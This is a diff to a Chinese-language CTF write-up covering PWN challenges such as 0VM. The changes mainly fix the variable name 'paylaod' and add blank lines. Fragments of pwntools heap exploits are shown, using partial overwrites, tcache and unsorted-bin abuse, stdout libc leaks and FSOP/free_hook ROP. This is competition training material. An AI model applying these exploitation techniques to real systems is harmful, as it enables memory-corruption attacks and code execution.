@@ -11,7 +11,9 @@
 ## PWN
 
 ### 0VM
+
 实现了一个简单的虚拟机，只不过虚拟机的指令是做完快速傅里叶变换后的膜长拼接出来的。做逆快速傅里叶变换就能求出应有的输入。虚拟机操作的内存通过单链表方式组织，在取出之后并没有将 block 的 fd 指针位置清空，但是已经将该 block 对应 mask 置1，所以可以正常读取泄露该指针，从而计算出libc地址。同时还有逻辑问题，在向链表插入mask为0 的 block 地址时，是先将要插入的 block 地址对应的内存置空，然后再去检查该 block 对应的 mask，所以可以用该漏洞，对一个已经加入链表的 block 空间的内存进行部分写空字节。然后就是劫持链表伪造结构体，从而进行任意读写了。
+
 ```python
 from pwn import *
 import os
@@ -186,7 +188,9 @@ https://mem2019.github.io/jekyll/update/2021/09/27/TCTF2021-Promise.html
 3. 修改size获得unsorted bin，partial write unsorted bin的fd把main_arena的bitsmap当作head。
 4. 一路往下写写到stdout，泄露libc，之后free_hook进行rop。
 5. 上一部分往下覆盖路过一个指针，如果指针指向内容不能读就会segfault，可以通过写另一个 fake size，然后利用free往上面打一个tcache的结构体地址，这样保证了那个地址可读
+
 ```python
+
 from pwn import *
 
 context.log_level = 'debug'
@@ -233,72 +237,72 @@ Add_Del(0x100, '')
 Add_Del(0x200, '')
 Add_Del(0x400, '')
 
-paylaod = '\x00'*0x18
-paylaod += p64(0x0001000000000000)
-paylaod += '\x00'*0x18
-paylaod += p64(0x0001000000000000)
-paylaod += '\x00'*0xb8
-paylaod += p16(0x72a0)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x18
+payload += p64(0x0001000000000000)
+payload += '\x00'*0x18
+payload += p64(0x0001000000000000)
+payload += '\x00'*0xb8
+payload += p16(0x72a0)
+Add_Del(0x280, payload)
 Add_Del(0x100, '\x00'*0xf0+p64(0)+p32(0x681))
 
-paylaod = '\x00'*0x18
-paylaod += p64(0x0000000100000000)
-paylaod += '\x00'*0x18
-paylaod += p64(0x0001000000000000)
-paylaod += '\x00'*0xb0
-paylaod += p16(0x73a0)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x18
+payload += p64(0x0000000100000000)
+payload += '\x00'*0x18
+payload += p64(0x0001000000000000)
+payload += '\x00'*0xb0
+payload += p16(0x73a0)
+Add_Del(0x280, payload)
 Add_Del(0xf0, '')
 Add_Del(0x1000, '')
 
-paylaod = '\x00'*0x18
-paylaod += p64(0)
-paylaod += '\x00'*0x18
-paylaod += p64(0x0001000000000000)
-paylaod += '\x00'*0x138
-paylaod += p16(0x72a0)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x18
+payload += p64(0)
+payload += '\x00'*0x18
+payload += p64(0x0001000000000000)
+payload += '\x00'*0x138
+payload += p16(0x72a0)
+Add_Del(0x280, payload)
 Add_Del(0x200, '\x00'*0xf0+p64(0)+p32(0x101))
 
-paylaod = '\x00'*0x78
-paylaod += p64(0x0001000000000000)
-paylaod += '\x00'*0x1f8
-paylaod += p16(0x73a0)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x78
+payload += p64(0x0001000000000000)
+payload += '\x00'*0x1f8
+payload += p16(0x73a0)
+Add_Del(0x280, payload)
 Add_Del(0x400, '')
 
 
 #
-paylaod = '\x00'*0x78
-paylaod += p64(0x0001000000000000)
-paylaod += '\x00'*0x1f8
-paylaod += p16(0x33f0)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x78
+payload += p64(0x0001000000000000)
+payload += '\x00'*0x1f8
+payload += p16(0x33f0)
+Add_Del(0x280, payload)
 
 
-paylaod = '\x00'*0x100
-paylaod += p64(0) + p64(0x300)
-Add_Del(0x400, paylaod)
+payload = '\x00'*0x100
+payload += p64(0) + p64(0x300)
+Add_Del(0x400, payload)
 
 
-paylaod = '\x00'*0x78
-paylaod += p64(0x0000000100000000)
-paylaod += '\x00'*0x1f0
-paylaod += p16(0x3500)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x78
+payload += p64(0x0000000100000000)
+payload += '\x00'*0x1f0
+payload += p16(0x3500)
+Add_Del(0x280, payload)
 
-paylaod = '\x00'*0x1a0
-paylaod += p64(0xfbad1800)
-paylaod += p64(0)*3
-paylaod += p16(0x3300)
-Add_Del(0x3f0, paylaod)
+payload = '\x00'*0x1a0
+payload += p64(0xfbad1800)
+payload += p64(0)*3
+payload += p16(0x3300)
+Add_Del(0x3f0, payload)
 
-paylaod = '\x00'*0x58
-paylaod += p64(0x0000000100000000)
-paylaod += '\x00'*0x190
-paylaod += p16(0x5b28)
-Add_Del(0x280, paylaod)
+payload = '\x00'*0x58
+payload += p64(0x0000000100000000)
+payload += '\x00'*0x190
+payload += p16(0x5b28)
+Add_Del(0x280, payload)
 
 
 sl('0'*0x1000)
@@ -423,7 +427,9 @@ irt()
 3. 提前布置好 rop_chain，申请 chunk 得到 stdout 并在合适的位置上填写**poc**实现 FSOP，劫持 rip 和 rsp 读取到 flag。
 
 EXP：
+
 ```python
+
 #encoding:utf-8
 from pwn import *
 import re
